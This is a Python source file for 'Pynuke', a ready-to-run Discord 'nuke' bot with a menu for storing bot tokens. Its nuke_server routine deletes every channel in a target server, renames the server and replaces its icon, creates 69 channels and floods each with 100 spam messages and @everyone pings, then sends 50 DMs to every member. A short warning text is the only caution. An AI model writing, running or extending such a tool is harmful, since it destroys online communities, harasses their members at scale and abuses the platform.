import os
import time
import json
import asyncio
import discord
import random
from discord.ext import commands
from pystyle import Colorate, Colors, Center

ASCII_ART = """
 _______   __      __  __    __  __    __  __    __  ________
|       \\ |  \\    /  \\|  \\  |  \\|  \\  |  \\|  \\  /  \\|        \\
| $$$$$$$\\ \\$$\\  /  $$| $$\\ | $$| $$  | $$| $$ /  $$| $$$$$$$$
| $$__/ $$  \\$$\\/  $$ | $$$\\| $$| $$  | $$| $$/  $$ | $$__
| $$    $$   \\$$  $$  | $$$$\\ $$| $$  | $$| $$  $$  | $$  \\
| $$$$$$$     \\$$$$   | $$\\$$ $$| $$  | $$| $$$$$\\  | $$$$$
| $$          | $$    | $$ \\$$$$| $$__/ $$| $$ \\$$\\ | $$_____
| $$          | $$    | $$  \\$$$ \\$$    $$| $$  \\$$\\| $$     \\
 \\$$           \\$$     \\$$   \\$$  \\$$$$$$  \\$$   \\$$ \\$$$$$$$$
"""

WARNING_TEXT = """
Pynuke is a highly disruptive bot. It is designed to cause chaos in Discord servers by creating multiple channels, flooding them with messages, and sending mass DMs. Use at your own risk.

Do not use on servers without explicit permission. Unauthorized usage can result in server bans and possible legal consequences.
Admin permissions are required for the bot to perform all actions, so ensure the bot has appropriate privileges before running.
This script may violate Discord's Terms of Service. Be sure you understand the potential consequences of using such a bot.

Press Enter to continue...
"""

MAIN_MENU = """
[1] Start Nuking
[2] Token Management
[3] Exit
"""

TOKENS_FILE = "tokens.json"

def create_image_folder():
    if not os.path.exists("images"):
        os.makedirs("images")
        print("Created 'images' folder to store custom images.")

def type_text_faster(text, duration=7):
    total_chars = len(text)
    delay = duration / total_chars
    for char in text:
        print(char, end="", flush=True)
        time.sleep(delay)
    print()

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def display_main_menu():
    clear_screen()
    print(Colorate.Horizontal(Colors.red_to_yellow, Center.XCenter(ASCII_ART)))
    print(Colorate.Horizontal(Colors.blue_to_purple, Center.XCenter(MAIN_MENU)))
    choice = input(Colorate.Horizontal(Colors.cyan_to_blue, "Select an option: "))
    return choice

def load_tokens():
    if os.path.exists(TOKENS_FILE):
        with open(TOKENS_FILE, "r") as file:
            return json.load(file)
    return {}

def save_tokens(tokens):
    with open(TOKENS_FILE, "w") as file:
        json.dump(tokens, file)

def token_management():
    tokens = load_tokens()
    clear_screen()
    print(Colorate.Horizontal(Colors.red_to_yellow, "Token Management"))
    if len(tokens) < 2:
        new_token = input("Enter a new bot token: ")
        token_name = f"Token {len(tokens) + 1}"
        tokens[token_name] = new_token
        save_tokens(tokens)
        print(f"{token_name} added successfully!")
    else:
        print("You already have 2 tokens stored.")
        print("Tokens:")
        for token_name, token in tokens.items():
            print(f"{token_name}: {token}")
    input("Press Enter to return to the main menu...")

def choose_token():
    tokens = load_tokens()
    if len(tokens) == 0:
        print("No tokens available. Please add tokens first.")
        input("Press Enter to return to the main menu...")
        return None
    clear_screen()
    print(Colorate.Horizontal(Colors.red_to_yellow, "Select a Token"))
    for idx, token_name in enumerate(tokens.keys(), 1):
        print(f"{idx}. {token_name}")
    choice = input("Enter the number of the token you want to use: ")
    try:
        choice = int(choice)
        if 1 <= choice <= len(tokens):
            return list(tokens.values())[choice - 1]
        else:
            print("Invalid choice.")
            input("Press Enter to try again...")
            return None
    except ValueError:
        print("Invalid input. Please enter a number.")
        input("Press Enter to try again...")
        return None

async def nuke_server(guild, messages, bot_user):
    try:
        images_folder = "images"
        image_files = [f for f in os.listdir(images_folder) if f.lower().endswith(('.png', '.jpg', '.jpeg', '.gif'))]
        if image_files:
            image_path = os.path.join(images_folder, image_files[0])
            with open(image_path, "rb") as image:
                await guild.edit(name="Nuked Server", icon=image.read())
                print(f"Server name changed to 'Nuked Server' and icon updated.")
        else:
            print("No images found in the 'images' folder. Skipping server icon update.")
    except Exception as e:
        print(f"Failed to update server name or icon: {e}")

    print("Nuking server please wait...")

    for channel in guild.channels:
        try:
            await channel.delete()
        except Exception:
            pass

    tasks = []
    for idx in range(69):
        channel_name = random.choice(["Join new server", "join new server", "join new server"])
        tasks.append(create_channel_and_spam(guild, channel_name, messages, idx))

    await asyncio.gather(*tasks)

    members = [member for member in guild.members if not member.bot]
    for member in members:
        try:
            dm_channel = member.dm_channel or await member.create_dm()
            for _ in range(50):
                await dm_channel.send(random.choice(messages))
            print(f"Sent DM to {member.name}")
        except Exception as e:
            print(f"Failed to send DM to {member.name}: {e}")

    print("Nuking done. Press Enter to exit.")

async def create_channel_and_spam(guild, channel_name, messages, idx):
    try:
        new_channel = await guild.create_text_channel(channel_name)
        for _ in range(100):
            await new_channel.send(random.choice(messages))
        if idx % 2 == 0:
            await new_channel.send("@everyone NUKKEE!!")
        if idx % 5 == 0:
            await new_channel.send("@here ADIOS!")
    except Exception as e:
        pass

def nuking_logic(token):
    clear_screen()
    print(Colorate.Horizontal(Colors.red_to_yellow, f"Starting Nuking with {token}"))
    bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())
    
    @bot.event
    async def on_ready():
        print(f"Bot is online as {bot.user}")
        guild_id = int(input("Enter the server ID to nuke: "))
        guild = discord.utils.get(bot.guilds, id=guild_id)
        if not guild:
            print("Invalid server ID.")
            await bot.close()
            return
        messages = input("Enter the spam messages (separated by ';'): ").strip().split(";")
        await nuke_server(guild, messages, bot.user)
        await bot.close()

    bot.run(token)

def main():
    create_image_folder()

    clear_screen()
    type_text_faster(Colorate.Horizontal(Colors.red_to_yellow, WARNING_TEXT), duration=7)
    input()

    while True:
        choice = display_main_menu()
        if choice == "1":
            token = choose_token()
            if token:
                nuking_logic(token)
        elif choice == "2":
            token_management()
        elif choice == "3":
            print(Colorate.Horizontal(Colors.green_to_cyan, "Exiting..."))
            break
        else:
            print(Colorate.Horizontal(Colors.red_to_yellow, "Invalid option. Try again."))
            time.sleep(1)

if __name__ == "__main__":
    main()
